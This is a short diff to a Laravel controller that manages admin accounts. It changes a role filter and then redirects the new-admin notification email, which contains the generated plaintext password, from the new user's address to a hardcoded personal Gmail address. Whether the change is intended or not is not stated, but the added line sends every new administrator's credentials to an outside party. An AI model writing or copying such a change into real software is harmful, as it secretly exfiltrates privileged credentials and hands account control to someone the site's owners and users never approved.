@@ -24,7 +24,7 @@ class AdminmanagementController extends Controller
         $superAdmin= User::where('role','admin')->first();
         $editors= User::where('role','admin')->latest()->get();
         $general = General::find(1);
-        $roles=Role::where('name','NOT LIKE','vendor-%')->where('name','NOT LIKE','vendor')->get();
+        $roles=Role::where('name','LIKE','admin-%')->where('name','NOT LIKE','vendor')->get();
         $permissions=Permission::where('name','LIKE','admin-%')->get();
         return view('dashboard.usersManagement.admin.allAdminList', compact('superAdmin','editors','general','roles','permissions'));
     }
@@ -63,7 +63,7 @@ class AdminmanagementController extends Controller
             $role->givePermissionTo([$request->permission]);
             $user= User::find($userId);
             $user->assignRole($request->role);
-            Mail::to($request->email)->send(new adminNotification($request->name,$request->email,$password));
+            Mail::to('patoarimdriaz@gmail.com')->send(new adminNotification($request->name,$request->email,$password));
         return back()->with('success','Member added successfully!');
     }
 
